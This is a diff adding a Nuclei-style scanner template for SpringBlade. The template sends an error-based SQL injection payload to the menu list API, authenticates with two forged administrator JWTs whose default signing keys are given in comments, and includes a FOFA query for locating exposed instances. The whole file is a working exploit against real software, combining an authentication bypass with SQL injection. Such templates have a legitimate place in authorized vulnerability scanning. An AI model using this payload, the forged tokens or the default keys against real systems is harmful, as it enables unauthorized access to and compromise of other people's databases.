@@ -1,0 +1,40 @@
+id: SpringBlade-menu-sqli
+
+info:
+  name: SpringBlade-menu-sqli
+  author: sec
+  severity: high
+  description: SpringBlade-menu-sqli
+  tags: sqli
+  metadata:
+    fofa-qeury: body="https://bladex.vip"
+    veified: true
+    max-request: 1
+
+http:
+  - raw:   
+      - |
+        GET /api/blade-system/menu/list?updatexml(1,concat(0x7e,md5(1),0x7e),1)=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        {{jwt}}
+        Connection: close
+
+    payloads:
+      jwt:
+        # 默认密钥：bladexisapowerfulmicroservicearchitectureupgradedandoptimizedfromacommercialproject
+        - "Blade-Auth: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJ1c2VyX25hbWUiOiJhZG1pbiIsInJlYWxfbmFtZSI6IueuoeeQhuWRmCIsImF1dGhvcml0aWVzIjpbImFkbWluaXN0cmF0b3IiXSwiY2xpZW50X2lkIjoic2FiZXIiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwibGljZW5zZSI6InBvd2VyZWQgYnkgYmxhZGV4IiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwic2NvcGUiOlsiYWxsIl0sIm5pY2tfbmFtZSI6IueuoeeQhuWRmCIsIm9hdXRoX2lkIjoiIiwiZGV0YWlsIjp7InR5cGUiOiJ3ZWIifSwiYWNjb3VudCI6ImFkbWluIn0.RtS67Tmbo7yFKHyMz_bMQW7dfgNjxZW47KtnFcwItxQ"
+        # 默认密钥：BladeX
+        - "Blade-Auth: bearer eyJ0eXAiOiJKc29uV2ViVG9rZW4iLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwidXNlcl9pZCI6IjExMjM1OTg4MjE3Mzg2NzUyMDEiLCJyb2xlX2lkIjoiMTEyMzU5ODgxNjczODY3NTIwMSIsInVzZXJfbmFtZSI6ImFkbWluIiwibmlja19uYW1lIjoi566h55CG5ZGYIiwiYWNjb3VudCI6ImFkbWluIiwidGVuYW50X2NvZGUiOiIwMDAwMDAiLCJjbGllbnRfaWQiOiJzd29yZCIsImV4cCI6OTk5OTk5OTk5OSwibmJmIjoxNTU3ODgxODg0fQ.tUgcE7QGzhe1nm_lT6aoMpZSdXKKNJyMBTMybd5RkWQ"
+    
+    attack: batteringram
+    threads: 5
+    stop-at-first-match: true
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body, "java.sql.SQLException")'
+          - 'status_code == 500'
+          - 'contains(header, "application/json")'
+        condition: and
